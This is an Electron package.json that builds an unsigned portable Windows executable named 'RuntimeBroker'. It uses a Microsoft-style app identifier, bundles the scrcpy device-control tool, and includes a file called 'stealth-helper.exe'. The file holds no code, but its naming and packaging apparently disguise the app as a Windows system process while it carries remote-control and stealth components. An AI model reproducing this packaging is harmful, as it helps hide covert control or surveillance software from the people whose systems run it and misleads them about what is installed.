{
  "name": "system-runtime-broker",
  "version": "1.0.0",
  "description": "System Runtime Broker",
  "main": "main.js",
  "scripts": {
    "start": "electron .",
    "pack": "electron-builder --dir",
    "dist": "electron-builder"
  },
  "author": "",
  "license": "MIT",
  "devDependencies": {
    "electron": "^28.0.0",
    "electron-builder": "^24.9.1"
  },
  "build": {
    "appId": "com.microsoft.system.runtimebroker",
    "productName": "RuntimeBroker",
    "artifactName": "RuntimeBroker-Setup.${ext}",
    "files": [
      "main.js",
      "preload.js",
      "renderer/**"
    ],
    "extraResources": [
      {
        "from": "scrcpy",
        "to": "scrcpy",
        "filter": ["**/*"]
      },
      {
        "from": "stealth-helper.exe",
        "to": "stealth-helper.exe"
      }
    ],
    "win": {
      "target": "portable",
      "icon": "renderer/icon.ico",
      "signDlls": false,
      "signAndEditExecutable": false
    },
    "portable": {
      "artifactName": "RuntimeBroker.${ext}"
    }
  }
}
